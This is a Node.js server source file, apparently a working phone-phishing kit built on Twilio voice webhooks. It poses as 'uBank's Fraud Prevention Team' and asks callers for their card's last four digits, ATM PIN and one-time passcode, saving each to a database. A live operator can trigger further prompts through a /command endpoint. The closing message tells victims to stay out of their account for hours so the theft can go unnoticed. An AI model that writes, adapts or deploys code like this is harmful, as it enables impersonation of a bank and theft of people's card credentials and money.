const express = require("express");
const VoiceResponse = require("twilio").twiml.VoiceResponse;
const mongoose = require("mongoose");
const cors = require("cors");
require("dotenv").config();

const uBank = require("./models/ubankModel");

const accountSid = process.env.accountSid;
const authToken = process.env.authToken;
const client = require("twilio")(accountSid, authToken);

const app = express();
app.use(cors());

const urlencoded = require("body-parser").urlencoded;
app.use(urlencoded({ extended: false }));

let ngrokUrl = "https://fc9f-51-89-242-48.eu.ngrok.io";

app.post("/statusChange", async (request, response) => {
  const { CallSid, CallStatus } = request.body;
  await uBank.findOneAndUpdate({ CallSid }, { CallStatus }).exec();
  response.sendStatus(200);
});

app.post("/command", async (request, response) => {
  const { status, CallSid } = request.body;
  await uBank.findOneAndUpdate({ CallSid }, { status }).exec();
  try {
    //1 resubmit last 4 and Pin
    //2 resubmit pin
    //3 submit otp
    if (status == 1) {
      await client
        .calls(CallSid)
        .update({
          method: "POST",
          url: `${ngrokUrl}/last4`,
        })
        .then((call) => console.log(call.to))
        .done();
    } else if (status == 2) {
      await client
        .calls(CallSid)
        .update({
          method: "POST",
          url: `${ngrokUrl}/pin`,
        })
        .then((call) => console.log(call.to))
        .done();
    } else if (status == 4) {
      await client
        .calls(CallSid)
        .update({
          method: "POST",
          url: `${ngrokUrl}/otp`,
        })
        .then((call) => console.log(call.to))
        .done();
    } else if (status == 6) {
      await client
        .calls(CallSid)
        .update({
          method: "POST",
          url: `${ngrokUrl}/finish`,
        })
        .then((call) => console.log(call.to))
        .done();
    }
    response.sendStatus(200);
  } catch (e) {
    console.log(e);
    response.send("Error").status(303);
  }
});

app.post("/voice", async (request, response) => {
  // Use the Twilio Node.js SDK to build an XML response
  const twiml = new VoiceResponse();
  twiml.say(
    { voice: "Polly.Nicole" },
    "Welcome to uBank's Fraud Prevention Team."
  );
  twiml.redirect("/last4");

  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());
});

app.post("/last4", async (request, response) => {
  let { From, CallSid } = request.body;
  let userCheck = await uBank.findOne({ CallSid }).exec();
  if (!userCheck) {
    await uBank.create({ CallSid, From, status: 1 });
  }
  const twiml = new VoiceResponse();
  const gather = twiml.gather({
    language: "en-AU",
    numDigits: 4,
    action: "/pin",
  });
  gather.say(
    "To verify your identity, please type the last 4 digits of any of your active cards attached to your account, this can be viewed in your mobile banking app if you have forgotten it."
  );
  // If the user doesn't enter input, loop
  twiml.redirect("/last4");

  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());
});

app.post("/pin", async (request, response) => {
  let { from, CallSid } = request.body;
  var last4 = JSON.stringify(request.body.Digits);
  await uBank.findOneAndUpdate({ CallSid }, { last4, status: 2 }).exec();
  const twiml = new VoiceResponse();
  const gather = twiml.gather({
    language: "en-AU",
    numDigits: 4,
    action: "/submitPin",
  });
  gather.say(
    "Next, please type the PIN of your card, this is the PIN you use at the ATM."
  );
  // If the user doesn't enter input, loop
  twiml.redirect("/pin");
  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());
});

app.post("/submitPin", async (request, response) => {
  let { CallSid } = request.body;
  var pin = JSON.stringify(request.body.Digits);
  await uBank.findOneAndUpdate({ CallSid }, { pin, status: 3 }).exec();

  const twiml = new VoiceResponse();
  twiml.say(
    { voice: "Polly.Nicole" },
    "Thank you. Please hold whilst we verify the details you have provided."
  );
  twiml.redirect("/wait");

  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());
});

app.post("/otp", async (request, response) => {
  const twiml = new VoiceResponse();
  const gather = twiml.gather({
    language: "en-AU",
    numDigits: 6,
    action: "/complete",
  });
  gather.say(
    "To complete the verification, please type the One Time Passcode sent to your mobile number."
  );
  // If the user doesn't enter input, loop
  twiml.redirect("/otp");
  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());
});

app.post("/complete", async (request, response) => {
  let { CallSid } = request.body;
  var otp = JSON.stringify(request.body.Digits);
  await uBank.findOneAndUpdate({ CallSid }, { otp, status: 5 }).exec();
  const twiml = new VoiceResponse();
  twiml.say(
    { voice: "Polly.Nicole" },
    "Thank you. Please hold whilst we verify the details you have provided."
  );
  twiml.redirect("/wait");

  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());
});

app.post("/finish", async (request, response) => {
  const twiml = new VoiceResponse();
  twiml.say(
    { voice: "Polly.Nicole" },
    "Thank you for verifying your identity. An agent will call you within 1 to 2 hours, please refrain from accessing your account within this time."
  );
  twiml.pause({ length: 10 });

  // Render the response as XML in reply to the webhook request
  response.type("text/xml");
  response.send(twiml.toString());

  twiml.hangup();
});

app.post("/wait", (request, response) => {
  const twiml = new VoiceResponse();
  twiml.play(
    {
      loop: 0,
    },
    "http://com.twilio.music.classical.s3.amazonaws.com/ith_chopin-15-2.mp3"
  );

  response.header("Content-Type", "text/xml");

  // Send the TwiML as the response.
  response.send(twiml.toString());
});

// Create an HTTP server and listen for requests on port 3000
mongoose.connect(process.env.mongoURL);
const db = mongoose.connection;
db.on("error", console.error.bind(console, "connection error: "));
db.once("open", () => {
  app.listen(3000, "0.0.0.0", () => {
    console.log("App listening on port", 3000);
  });
});
